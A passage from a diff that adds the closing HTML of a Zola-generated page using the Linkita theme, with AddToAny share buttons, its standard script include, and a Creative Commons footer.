+    <a class="a2a_button_threads"></a>
+    <a class="a2a_button_bluesky"></a>
+    <a class="a2a_button_whatsapp"></a>
+  </div>
+  <br>
+  <script async src="https://static.addtoany.com/menu/page.js"></script>
+</div>
+
+
+  <!-- End Page End inject -->
+</article>
+
+  </main>
+  <!-- Footer -->
+<footer class="mx-auto flex lg:mt-5 max-w-3xl flex-wrap items-center px-4 py-3 text-sm opacity-60">
+  <div class="mr-auto basis-full lg:basis-1/2">
+  <a href="https://creativecommons.org/licenses/by-sa/4.0/deed">© <time datetime="2017">2017</time> - <time datetime="2025">2025</time></a>
+  </div>
+  <div class="flex basis-full lg:basis-1/2 lg:justify-end">
+    <span class="mr-6 lg:ml-6">
+      <a class="link" href="https://www.getzola.org/" target="_blank">Powered by Zola</a>
+    </span>
+    <a class="link" href="https://www.getzola.org/themes/linkita/" target="_blank">&#9998; Linkita</a>
+  </div>
+  <!-- Begin Footer inject -->
+  
+  <!-- End Footer inject -->
+</footer>
+
+  
+
+  <!-- Begin Body End inject -->
+  
+  <!-- End Body End inject -->
+</body>
+
+</html>
